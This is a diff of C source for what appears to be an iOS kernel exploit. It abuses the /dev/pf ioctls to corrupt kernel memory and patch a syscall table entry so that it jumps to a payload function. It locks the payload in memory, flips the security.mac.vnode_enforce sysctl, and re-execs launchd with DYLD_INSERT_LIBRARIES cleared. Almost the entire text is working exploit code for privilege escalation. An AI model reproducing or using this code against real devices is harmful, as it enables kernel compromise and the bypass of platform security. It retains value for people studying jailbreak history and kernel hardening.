@@ -22,9 +22,18 @@
 #ifndef DEBUG
 // strings are big and not very sneaky.
 #undef assert
-__attribute__((always_inline))
-static inline void assert(bool x) {
-    if(!x) abort();
+#define assert(x) do { if(!(x)) abort(); } while(0)
+#endif
+
+#if 1
+#undef assert
+#define assert(x) do { if(!(x)) failz(__LINE__); } while(0)
+
+static void failz(int line) {
+    line += 10000;
+    sysctlbyname("net.inet6.ip6.hdrnestlimit", NULL, 0, &line, sizeof(line));
+    setenv("DYLD_INSERT_LIBRARIES", "", 1);
+    execl("/sbin/launchd", "/sbin/launchd", NULL);
 }
 #endif
 
@@ -94,7 +103,7 @@ static inline void flush(void *addr, unsigned size) {
     invalidate_icache(addr, size, false);
 }
 
-static int ok_go(void *p, void *uap, unsigned int *retval) {
+static int ok_go_real(void *p, void *uap, unsigned int *retval) {
 #ifdef DEBUG
     IOLog("Whoa, I'm here!...\n");
 #endif
@@ -124,44 +133,17 @@ static int ok_go(void *p, void *uap, unsigned int *retval) {
 
 }
 
-void loopback_setup_ipv4() {
-    struct ifaliasreq ifra;
-    struct ifreq ifr;
-    int s;
-
-    memset(&ifr, 0, sizeof(ifr));
-    strcpy(ifr.ifr_name, "lo0");
-
-    if ((s = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
-        return;
-
-    if ((ioctl(s, SIOCGIFFLAGS, &ifr) != -1)) {
-        ifr.ifr_flags |= IFF_UP;
-        (ioctl(s, SIOCSIFFLAGS, &ifr) != -1);
-    }
-
-    memset(&ifra, 0, sizeof(ifra));
-    strcpy(ifra.ifra_name, "lo0");
-    ((struct sockaddr_in *)&ifra.ifra_addr)->sin_family = AF_INET;
-    ((struct sockaddr_in *)&ifra.ifra_addr)->sin_addr.s_addr = htonl(INADDR_LOOPBACK);
-    ((struct sockaddr_in *)&ifra.ifra_addr)->sin_len = sizeof(struct sockaddr_in);
-    ((struct sockaddr_in *)&ifra.ifra_mask)->sin_family = AF_INET;
-    ((struct sockaddr_in *)&ifra.ifra_mask)->sin_addr.s_addr = htonl(IN_CLASSA_NET);
-    ((struct sockaddr_in *)&ifra.ifra_mask)->sin_len = sizeof(struct sockaddr_in);
-
-    ioctl(s, SIOCAIFADDR, &ifra);
-
-    close(s);
+__attribute__((section("__HIGHROAD,__highroad"), naked, used))
+static int ok_go(void *p, void *uap, unsigned int *retval) {
+    asm(CONFIG_LOTS_OF_NOPS);
+    unsigned int ok = ((unsigned int) &ok_go_real) | 1;
+    asm("bx %0" :: "r"(ok));
 }
 
-
-__attribute__((constructor))
-static void go() {
-    if(0) loopback_setup_ipv4();
-
-    unsigned int target_addr = (CONFIG_SYSENT_PATCH_ORIG & 0x00ffffff) | 0x2f000000;
+int main() {
+    unsigned int target_addr = CONFIG_TARGET_ADDR;
+    unsigned int target_pagebase = target_addr & ~0xfff;
     unsigned int num_decs = (CONFIG_SYSENT_PATCH_ORIG - target_addr) >> 24;
-    
     // Yes, reopening is necessary
     pffd = open("/dev/pf", O_RDWR);
     ioctl(pffd, DIOCSTOP);
@@ -171,18 +153,9 @@ static void go() {
     assert(!ioctl(pffd, DIOCSTOP));
     close(pffd);
     
-    void *target_pagebase = (void *)(target_addr & ~0xfff);
-    assert(MAP_FAILED != mmap(target_pagebase, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON | MAP_FIXED, -1, 0));
-    unsigned int val;
-    if(target_addr & 1) {
-        target_addr &= ~1;
-        *((unsigned int *) target_addr) = 0x47184b00; // ldr r3, [pc]; bx r3
-    } else {
-        *((unsigned int *) target_addr) = 0xe59ff000; // ldr pc, [pc]
-    }
-    *((void **) (target_addr + 4)) = &ok_go;
-    assert(!mprotect(target_pagebase, 0x2000, PROT_READ | PROT_EXEC));
-    assert(!mlock(target_pagebase, 0x2000));
+    assert(!mlock((void *) ((unsigned int)(&ok_go_real) & ~0xfff), 0x1000));
+    assert(!mlock((void *) ((unsigned int)(&flush) & ~0xfff), 0x1000));
+    assert(!mlock((void *) ((unsigned int)(&ok_go) & ~0xfff), 0x1000));
 #ifdef DEBUG
     printf("ok\n"); fflush(stdout);
 #endif
@@ -190,12 +163,13 @@ static void go() {
 #ifdef DEBUG
     printf("we're out\n"); fflush(stdout);
 #endif
-    assert(!munlock(target_pagebase, 0x2000));
-
+    
     // turn this fancy stuff back on
     int one = 1;
     assert(!sysctlbyname("security.mac.vnode_enforce", NULL, 0, &one, sizeof(one)));
-    
+
+    failz(42);
+    return 0;
     setenv("DYLD_INSERT_LIBRARIES", "", 1);
     execl("/sbin/launchd", "/sbin/launchd", NULL);
 }
